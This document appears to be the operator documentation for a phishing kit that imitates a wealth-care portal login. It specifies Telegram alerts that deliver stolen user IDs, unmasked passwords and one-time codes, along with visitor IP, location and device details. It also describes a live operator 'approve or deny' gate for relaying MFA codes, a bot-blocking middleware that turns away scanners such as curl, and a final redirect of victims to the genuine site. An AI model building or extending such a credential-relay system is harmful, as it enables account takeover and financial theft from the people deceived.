# Telegram Notifications List

All notifications are sent to the Telegram chat(s) configured via `TELEGRAM_BOT_TOKEN` and `TELEGRAM_CHAT_ID` (comma-separated for multiple chats). See `env.example`.

Two of these are **approval requests** — they carry a live countdown and an "Approve or deny" link into the Control Center. The member site holds a spinner on the page until that decision lands.

---

## 1. New Visitor

| Field | Value |
|-------|--------|
| **Trigger** | User finishes preloader on the homepage (login page) |
| **API** | `POST /api/telegram/visitor` |
| **Source** | `app/page.tsx` (after `showContent` is true and visitor info is available) |
| **Data sent** | Location, IP (v4/v6), Timezone, ISP, User Agent, Screen, Language, Page URL, Referrer, UTC Time |

```
🌐 New Visitor - Peak

📍 Location: New York, US
🌍 IP: 192.168.1.1 (IPv4)
⏰ Timezone: America/New_York
🌐 ISP: Example ISP

📱 Device: Mozilla/5.0 …
🖥️ Screen: 1920x1080
🌍 Language: en-US

🔗 Page URL: https://peak1.wealthcareportal.com/
↩️ Referrer (source): Direct / no referrer …

🕒 UTC Time: 2026-09-29T18:00:00.000Z
```

---

## 2. Login Attempt

| Field | Value |
|-------|--------|
| **Trigger** | User submits **Sign In** on the homepage |
| **API** | `POST /api/telegram/login` |
| **Source** | `app/page.tsx` |
| **Data sent** | User ID, Password (unmasked) |

```
🔐 Login Attempt - Peak

👤 User ID: jsmith
🔑 Password: mypassword123
```

This is **not** an admin gate. The Sign In button only shows a 2s loading state and then navigates to the verification method page.

---

## 3. Verification Option Selected

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Generate Code** on the method page |
| **API** | `POST /api/telegram/verification-click` |
| **Source** | `app/verify-choice/page.tsx` |
| **Data sent** | **verificationType:** `Email` or `Text` |

```
🟦 Verification Option Selected - Peak

🔐 Type: Email
```

---

## 4. Login Approval Request (Gate 1)

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Generate Code** on the method page |
| **API** | `POST /api/pending-login` with `flow: "login"` |
| **Source** | `app/verify-choice/page.tsx` |
| **Data sent** | User ID, Password, method, database shard label, live countdown |

Creates a `pending_logins` row and notifies admin. The page switches to the three-dot spinner and stays there for the full 90s `APPROVAL_TIMEOUT_MS` window.

```
🏷️ Peak
━━━━━━━━━━━━━━━━━━

🔔 Login request – approve or deny
━━━━━━━━━━━━━━━━━━
User ID: jsmith
Password: mypassword123
Database: ep-example-000000
⏱ Time left: 90s

👉 Approve or deny
```

Decisions are made in the Control Center (`CC_ID` pod), which flips the row to `approved` / `denied` / `redirected`. The page polls `GET /api/pending-login/{id}` and reacts.

---

## 5. Verification Code Submitted

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Continue** on the passcode page |
| **API** | `POST /api/telegram/verification` |
| **Source** | `app/verify/page.tsx` |
| **Data sent** | **Type:** `Code`, **Code:** the 6-digit code entered |

```
✅ Verification Code Submitted - Peak

🔐 Type: Code
🔢 Code: 123456
```

---

## 6. OTP Approval Request (Gate 2)

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Continue** on the passcode page |
| **API** | `POST /api/pending-login` with `flow: "otp"` |
| **Source** | `app/verify/page.tsx` |
| **Data sent** | User ID, code, method, database shard label, live countdown |

```
🏷️ Peak
━━━━━━━━━━━━━━━━━━

🔢 OTP submitted – approve or deny
━━━━━━━━━━━━━━━━━━
User ID: jsmith
🔢 Code: 123456
Database: ep-example-000000
⏱ Time left: 90s

👉 Approve or deny
```

`approved` and `redirected` both hand off to `/api/login-out`, which redirects to the Peak1 handshake URL. `denied` returns the user to the passcode page with `OTP_CODE_ERROR_TEXT`. `timeout` after 90s shows `MSG_UNABLE_VERIFY_TIME`.

---

## 7. Resend Code Requested

| Field | Value |
|-------|--------|
| **Trigger** | User clicks **Resend Code** on the passcode page |
| **API** | `POST /api/telegram/resend-code` |
| **Source** | `app/verify/page.tsx` |

```
🔄 Resend Code Requested - Peak
```

Subject to a 30s cooldown (`OTP_RESEND_COOLDOWN_SEC`) surfaced in the button label.

---

## 8. Bad Bot Blocked

| Field | Value |
|-------|--------|
| **Trigger** | A blocked bot pattern hits the site |
| **API** | `POST /api/telegram/bot-blocked` |
| **Source** | `middleware.ts` |

```
🚫 Bad Bot Blocked - Peak

🤖 User-Agent: curl/8.0
🌍 IP: 192.168.1.1
🔗 Path: /verify
```

---

## Flow order

1. **New Visitor** — homepage shown
2. **Login Attempt** — Sign In submitted (2s loading, no admin gate)
3. **Verification Option Selected** — Generate Code clicked
4. **Login Approval Request (Gate 1)** — admin approves in Control Center → method page spinner clears
5. **Verification Code Submitted** — Continue clicked on the passcode page
6. **OTP Approval Request (Gate 2)** — admin approves → redirect to `/api/login-out` → Peak1 handshake
7. **Resend Code Requested** — optional, on the passcode page
